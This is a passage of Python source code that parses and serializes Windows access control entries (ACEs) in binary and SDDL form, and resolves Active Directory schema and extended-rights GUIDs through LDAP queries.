	"e263192c-2a02-48df-9792-94f2328781a0": "msSFU-30-Net-Id",
	"d6710785-86ff-44b7-85b5-f1f8689522ce": "msSFU-30-Mail-Aliases",
	"4bcb2477-4bb3-4545-a9fc-fb66e136b435": "BootableDevice",
	"a699e529-a637-4b7d-a0fb-5dc466a0b8a7": "IEEE802Device",
	"904f8a93-4954-4c5f-b1e1-53c097a31e13": "NisObject",
	"7672666c-02c1-4f33-9ecf-f649c1dd9b7c": "NisMap",
	"72efbf84-6e7b-4a5c-a8db-8a75a7cad254": "NisNetgroup",
	"d95836c3-143e-43fb-992a-b057f1ecadf9": "IpNetwork",
	"ab911646-8827-4f95-8780-5a8f008eb68f": "IpHost",
	"cadd1e5e-fefc-4f3f-b5a9-70e994204303": "OncRpc",
	"9c2dcbd2-fbf0-4dc7-ace0-8356dcd0f013": "IpProtocol",
	"2517fadf-fa97-48ad-9de6-79ac5721f864": "IpService",
	"2a9350b8-062c-4ed0-9903-dde10d06deba": "PosixGroup",
	"5b6d8467-1a18-4174-b350-9cc6e7b4ac8d": "ShadowAccount",
	"ad44bb41-67d5-4d88-b575-7b20674e76d8": "PosixAccount",
	"bf967abb-0de6-11d0-a285-00aa003049e2": "Volume",
	"bf967aba-0de6-11d0-a285-00aa003049e2": "User",
	"281416e2-1968-11d0-a28f-00aa003049e2": "Type-Library",
	"bf967ab8-0de6-11d0-a285-00aa003049e2": "Trusted-Domain",
	"bf967ab7-0de6-11d0-a285-00aa003049e2": "Top"
}

# Despite most GUIDs have been hardcoded, some can be missing
# Reason: New features installed on AD wich add new attributes into LDAP
# Thus, search into LDAP: name for rightsGUID, schemaIDGUID
def resolveGUID(conn, server, guid_str):
	name = ''

	base_dn = f"CN=Extended-Rights,CN=Configuration,{server.info.other['defaultNamingContext'][0]}"
	entry_generator_rightsGUID = search(conn, server, baseDN = base_dn, filter = f"(rightsGUID={guid_str})", attributes = ["name"])
	for entry in entry_generator_rightsGUID:
		if entry["type"] == "searchResEntry":
			if (entry["raw_attributes"]["name"] != []):
				name = entry["raw_attributes"]["name"][0].decode()

	base_dn = f"CN=Schema,CN=Configuration,{server.info.other['defaultNamingContext'][0]}"
	guidBytes = GUID.from_string(guid_str).to_bytes()
	entry_generator_schemaIDGUID = search(conn, server, baseDN = base_dn, filter = f"(schemaIDGUID={escape_bytes(guidBytes)})", attributes = ["name"])
	for entry in entry_generator_schemaIDGUID:
		if entry["type"] == "searchResEntry":
			if (entry["raw_attributes"]["name"] != []):
				name = entry["raw_attributes"]["name"][0].decode()

	return name

def SDDL_TO_ACE_OBJECT_GUID_STR(conn, server, guid_str):
	if guid_str == '':
		return "<None>"
	else:
		if guid_str in SDDL_ACE_CONTROL_ACCESS_RIGHTS_MAPS:
			object_guid = SDDL_ACE_CONTROL_ACCESS_RIGHTS_MAPS[guid_str]
		elif guid_str in SDDL_ACE_PROPERTY_SETS_MAPS:
			object_guid = SDDL_ACE_PROPERTY_SETS_MAPS[guid_str]
		elif guid_str in SDDL_ACE_VALIDATED_WRITES_MAPS:
			object_guid = SDDL_ACE_VALIDATED_WRITES_MAPS[guid_str]
		elif guid_str in SDDL_ACE_SCHEMAIDGUID_MAPS:
			object_guid = SDDL_ACE_SCHEMAIDGUID_MAPS[guid_str]
		else:
			try:
				name = resolveGUID(conn, server, guid_str)
			except:
				name = ''
			if (name != ''):
				object_guid = name
			else:
				object_guid = guid_str
		return object_guid

### ACE Structures ###

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/628ebb1d-c509-4ea0-a10f-77ef97ca4586
class ACEHeader:
	def __init__(self):
		self.AceType = None
		self.AceFlags = None
		self.AceSize = None

	def to_buffer(self, buff):
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))

	@staticmethod
	def from_bytes(data):
		return ACEHeader.from_buffer(io.BytesIO(data))

	@staticmethod
	def from_buffer(buff):
		hdr = ACEHeader()
		hdr.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		hdr.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		hdr.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		return hdr

	@staticmethod
	def pre_parse(buff):
		pos = buff.tell()
		hdr = ACEHeader()
		hdr.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		hdr.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		hdr.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		buff.seek(pos,0)
		return hdr

# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/c79a383c-2b3f-4655-abe7-dcbb7ce0cfbe
class ACE_OBJECT_PRESENCE(enum.IntFlag):
	NONE = 0x00000000 # Neither ObjectType nor InheritedObjectType are valid.
	ACE_OBJECT_TYPE_PRESENT = 0x00000001 # ObjectType is valid.
	ACE_INHERITED_OBJECT_TYPE_PRESENT = 0x00000002 # InheritedObjectType is valid. If this value is not specified, all types of child objects can inherit the ACE.

# https://learn.microsoft.com/en-us/windows/win32/secauthz/ace-strings
class ACE:
	def __init__(self):
		pass

	@staticmethod
	def from_bytes(data, sd_object_type = None):
		return ACE.from_buffer(io.BytesIO(data), sd_object_type)

	@staticmethod
	def from_buffer(buff, sd_object_type = None):
		hdr = ACEHeader.pre_parse(buff)
		obj = ACEType2ACE.get(hdr.AceType)
		if not obj:
			raise Exception('[-] ACE type %s not implemented!' % hdr.AceType)
		return obj.from_buffer(io.BytesIO(buff.read(hdr.AceSize)), sd_object_type)

	def to_buffer(self, buff):
		pass

	def to_bytes(self):
		buff = io.BytesIO()
		self.to_buffer(buff)
		buff.seek(0)
		return buff.read()

	def to_sddl(self, sd_object_type = None):
		pass

	@staticmethod
	def from_sddl(sddl:str, ace_rights_adcs = False, object_type = None, domain_sid = None):

		if sddl.startswith('('):
			sddl = sddl[1:]
		if sddl.endswith(')'):
			sddl = sddl[:-1]

		ace_type, ace_flags, rights, object_guid, inherit_object_guid, account_sid = sddl.split(';')

		# ACE Type
		ace_type = SDDL_TO_ACE_TYPE(ace_type)
		ace = ACEType2ACE[ace_type]()

		# ACE Flags
		flags = SDDL_TO_ACE_FLAGS(ace_flags)
		ace.AceFlags = ACEFlags(flags)

		# ACE Access Rights
		if ace_rights_adcs:
			mask = SDDL_TO_ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY(rights)
		else:
			mask = SDDL_TO_ACE_ACCESS_RIGHTS(rights)
		ace.Mask = mask

		# ACE Object Type and Inherited Object Type
		ace.sd_object_type = object_type
		ace.Flags = 0
		if object_guid != '':
			ace.Flags |= ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT
			ace.ObjectType = GUID.from_string(object_guid)
		if inherit_object_guid != '':
			ace.Flags |= ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT
			ace.InheritedObjectType = GUID.from_string(inherit_object_guid)

		# ACE SID
		ace.Sid = SID.from_sddl(account_sid, domain_sid = domain_sid)

		return ace

	@staticmethod
	def add_padding(x):
		if (4 + len(x)) % 4 != 0:
			x += b'\x00' * ((4 + len(x)) % 4)
		return x

# https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/628ebb1d-c509-4ea0-a10f-77ef97ca4586
class SE_OBJECT_TYPE(enum.Enum):
	SE_UNKNOWN_OBJECT_TYPE = 0 # Unknown object type.
	SE_FILE_OBJECT = 1 # Indicates a file or directory.
	SE_SERVICE = 2 # Indicates a Windows service
	SE_PRINTER = 3 # Indicates a printer.
	SE_REGISTRY_KEY = 4 # Indicates a registry key.
	SE_LMSHARE = 5 # Indicates a network share.
	SE_KERNEL_OBJECT = 6 # Indicates a local
	SE_WINDOW_OBJECT = 7 # Indicates a window station or desktop object on the local computer
	SE_DS_OBJECT = 8 # Indicates a directory service object or a property set or property of a directory service object.
	SE_DS_OBJECT_ALL = 9 # Indicates a directory service object and all of its property sets and properties.
	SE_PROVIDER_DEFINED_OBJECT = 10 # Indicates a provider-defined object.
	SE_WMIGUID_OBJECT = 11 # Indicates a WMI object.
	SE_REGISTRY_WOW64_32KEY = 12 # Indicates an object for a registry entry under WOW64.
	SE_REGISTRY_WOW64_64KEY = 13 # Indicates an object for a registry entry under WOW64.

class ACCESS_ALLOWED_ACE(ACE):
	def __init__(self):
		self.AceType = ACEType.ACCESS_ALLOWED_ACE_TYPE
		self.AceFlags = None
		self.AceSize = 0
		self.Mask = None
		self.Sid = None
		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type = None):
		ace = ACCESS_ALLOWED_ACE()
		ace.sd_object_type = SE_OBJECT_TYPE(sd_object_type) if sd_object_type else None
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

	def to_sddl(self, ace_rights_adcs = False, sd_object_type = None):
		# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
		return '(%s;%s;%s;%s;%s;%s)' % (
			ACE_TYPE_TO_SDDL(self.AceType),
			ACE_FLAGS_TO_SDDL(self.AceFlags),
			ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_TO_SDDL(self.Mask) if ace_rights_adcs else ACE_ACCESS_RIGHTS_TO_SDDL(self.Mask),
			'',
			'',
			self.Sid.to_sddl()
		)

class ACCESS_DENIED_ACE(ACE):
	def __init__(self):
		self.AceType = ACEType.ACCESS_DENIED_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		ace = ACCESS_DENIED_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

	def to_sddl(self, ace_rights_adcs = False, sd_object_type = None):
		# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
		return '(%s;%s;%s;%s;%s;%s)' % (
			ACE_TYPE_TO_SDDL(self.AceType),
			ACE_FLAGS_TO_SDDL(self.AceFlags),
			ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_TO_SDDL(self.Mask) if ace_rights_adcs else ACE_ACCESS_RIGHTS_TO_SDDL(self.Mask),
			'',
			'',
			self.Sid.to_sddl()
		)

class SYSTEM_AUDIT_ACE(ACE):
	def __init__(self):
		self.AceType = ACEType.SYSTEM_AUDIT_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		ace = SYSTEM_AUDIT_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)


	def to_sddl(self, ace_rights_adcs = False, sd_object_type = None):
		# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
		return '(%s;%s;%s;%s;%s;%s)' % (
			ACE_TYPE_TO_SDDL(self.AceType),
			ACE_FLAGS_TO_SDDL(self.AceFlags),
			ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_TO_SDDL(self.Mask) if ace_rights_adcs else ACE_ACCESS_RIGHTS_TO_SDDL(self.Mask),
			'',
			'',
			self.Sid.to_sddl()
		)

class SYSTEM_ALARM_ACE(ACE):
	def __init__(self):
		self.AceType = ACEType.SYSTEM_ALARM_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		ace = SYSTEM_ALARM_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

	def to_sddl(self, ace_rights_adcs = False, sd_object_type = None):
		# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
		return '(%s;%s;%s;%s;%s;%s)' % (
			ACE_TYPE_TO_SDDL(self.AceType),
			ACE_FLAGS_TO_SDDL(self.AceFlags),
			ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_TO_SDDL(self.Mask) if ace_rights_adcs else ACE_ACCESS_RIGHTS_TO_SDDL(self.Mask),
			'',
			'',
			self.Sid.to_sddl()
		)

class ACCESS_ALLOWED_OBJECT_ACE:
	def __init__(self):
		self.AceType = ACEType.ACCESS_ALLOWED_OBJECT_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Flags = None
		self.ObjectType = None
		self.InheritedObjectType = None
		self.Sid = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		ace = ACCESS_ALLOWED_OBJECT_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Flags = ACE_OBJECT_PRESENCE(int.from_bytes(buff.read(4), 'little', signed = False))
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			ace.ObjectType = GUID.from_buffer(buff)
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			ace.InheritedObjectType = GUID.from_buffer(buff)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		if self.ObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT
		if self.InheritedObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT

		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Flags.to_bytes(4, 'little', signed = False)
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			t += self.ObjectType.to_bytes()
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			t += self.InheritedObjectType.to_bytes()

		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

	def to_sddl(self, ace_rights_adcs = False, sd_object_type = None):
		# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
		return '(%s;%s;%s;%s;%s;%s)' % (
			ACE_TYPE_TO_SDDL(self.AceType),
			ACE_FLAGS_TO_SDDL(self.AceFlags),
			ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_TO_SDDL(self.Mask) if ace_rights_adcs else ACE_ACCESS_RIGHTS_TO_SDDL(self.Mask),
			str(self.ObjectType) if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT else '' ,
			str(self.InheritedObjectType) if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT else '',
			self.Sid.to_sddl()
		)

class ACCESS_DENIED_OBJECT_ACE:
	def __init__(self):
		self.AceType = ACEType.ACCESS_DENIED_OBJECT_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Flags = None
		self.ObjectType = None
		self.InheritedObjectType = None
		self.Sid = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		ace = ACCESS_DENIED_OBJECT_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Flags = ACE_OBJECT_PRESENCE(int.from_bytes(buff.read(4), 'little', signed = False))
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			ace.ObjectType = GUID.from_buffer(buff)
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			ace.InheritedObjectType = GUID.from_buffer(buff)
		ace.Sid = SID.from_buffer(buff)
		return ace

	def to_buffer(self, buff):
		if self.ObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT
		if self.InheritedObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT

		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Flags.to_bytes(4, 'little', signed = False)
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			t += self.ObjectType.to_bytes()
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			t += self.InheritedObjectType.to_bytes()

		t += self.Sid.to_bytes()
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

	def to_sddl(self, ace_rights_adcs = False, sd_object_type = None):
		# ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
		return '(%s;%s;%s;%s;%s;%s)' % (
			ACE_TYPE_TO_SDDL(self.AceType),
			ACE_FLAGS_TO_SDDL(self.AceFlags),
			ACE_ACCESS_RIGHTS_CERTIFICATIONAUTHORITY_TO_SDDL(self.Mask) if ace_rights_adcs else ACE_ACCESS_RIGHTS_TO_SDDL(self.Mask),
			str(self.ObjectType) if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT else '',
			str(self.InheritedObjectType) if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT else '',
			self.Sid.to_sddl()
		)

class SYSTEM_AUDIT_OBJECT_ACE:
	def __init__(self):
		self.AceType = ACEType.SYSTEM_AUDIT_OBJECT_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Flags = None
		self.ObjectType = None
		self.InheritedObjectType = None
		self.Sid = None
		self.ApplicationData = None #must be bytes!


		self.sd_object_type = None
	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = SYSTEM_AUDIT_OBJECT_ACE()
		ace.sd_object_type  = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Flags = ACE_OBJECT_PRESENCE(int.from_bytes(buff.read(4), 'little', signed = False))
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			ace.ObjectType = GUID.from_buffer(buff)
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			ace.InheritedObjectType = GUID.from_buffer(buff)
		ace.Sid = SID.from_buffer(buff)
		ace.ApplicationData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
		if self.ObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT
		if self.InheritedObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT

		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Flags.to_bytes(4, 'little', signed = False)
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			t += self.ObjectType.to_bytes()
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			t += self.InheritedObjectType.to_bytes()

		t += self.Sid.to_bytes()
		t += self.ApplicationData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class ACCESS_ALLOWED_CALLBACK_ACE:
	def __init__(self):
		self.AceType = ACEType.ACCESS_ALLOWED_CALLBACK_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None
		self.ApplicationData = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = ACCESS_ALLOWED_CALLBACK_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		ace.ApplicationData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t += self.ApplicationData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class ACCESS_DENIED_CALLBACK_ACE:
	def __init__(self):
		self.AceType = ACEType.ACCESS_DENIED_CALLBACK_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Sid = None
		self.ApplicationData = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = ACCESS_DENIED_CALLBACK_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Sid = SID.from_buffer(buff)
		ace.ApplicationData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Sid.to_bytes()
		t += self.ApplicationData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class ACCESS_ALLOWED_CALLBACK_OBJECT_ACE:
	def __init__(self):
		self.AceType = ACEType.ACCESS_ALLOWED_CALLBACK_OBJECT_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Flags = None
		self.ObjectType = None
		self.InheritedObjectType = None
		self.Sid = None
		self.ApplicationData = None

		self.sd_object_type = None

	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = ACCESS_ALLOWED_CALLBACK_OBJECT_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Flags = ACE_OBJECT_PRESENCE(int.from_bytes(buff.read(4), 'little', signed = False))
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			ace.ObjectType = GUID.from_buffer(buff)
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			ace.InheritedObjectType = GUID.from_buffer(buff)
		ace.Sid = SID.from_buffer(buff)
		ace.ApplicationData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
		if self.ObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT
		if self.InheritedObjectType is not None:
			if self.Flags is None:
				self.Flags = 0
			self.Flags |= ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT

		t = self.Mask.to_bytes(4, 'little', signed = False)
		t += self.Flags.to_bytes(4, 'little', signed = False)
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			t += self.ObjectType.to_bytes()
		if self.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			t += self.InheritedObjectType.to_bytes()

		t += self.Sid.to_bytes()
		t += self.ApplicationData
		t = ACE.add_padding(t)
		self.AceSize = 4 + len(t)
		buff.write(self.AceType.value.to_bytes(1, 'little', signed = False))
		buff.write(self.AceFlags.to_bytes(1, 'little', signed = False))
		buff.write(self.AceSize.to_bytes(2, 'little', signed = False))
		buff.write(t)

class ACCESS_DENIED_CALLBACK_OBJECT_ACE:
	def __init__(self):
		self.AceType = ACEType.ACCESS_DENIED_CALLBACK_OBJECT_ACE_TYPE
		self.AceFlags = None
		self.AceSize = None
		self.Mask = None
		self.Flags = None
		self.ObjectType = None
		self.InheritedObjectType = None
		self.Sid = None
		self.ApplicationData = None

		self.sd_object_type = None
	@staticmethod
	def from_buffer(buff, sd_object_type):
		start = buff.tell()
		ace = ACCESS_DENIED_CALLBACK_OBJECT_ACE()
		ace.sd_object_type = sd_object_type
		ace.AceType = ACEType(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceFlags = ACEFlags(int.from_bytes(buff.read(1), 'little', signed = False))
		ace.AceSize = int.from_bytes(buff.read(2), 'little', signed = False)
		ace.Mask = int.from_bytes(buff.read(4), 'little', signed = False)
		ace.Flags = ACE_OBJECT_PRESENCE(int.from_bytes(buff.read(4), 'little', signed = False))
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_OBJECT_TYPE_PRESENT:
			ace.ObjectType = GUID.from_buffer(buff)
		if ace.Flags & ACE_OBJECT_PRESENCE.ACE_INHERITED_OBJECT_TYPE_PRESENT:
			ace.InheritedObjectType = GUID.from_buffer(buff)
		ace.Sid = SID.from_buffer(buff)
		ace.ApplicationData = buff.read(ace.AceSize - (buff.tell() - start))
		return ace

	def to_buffer(self, buff):
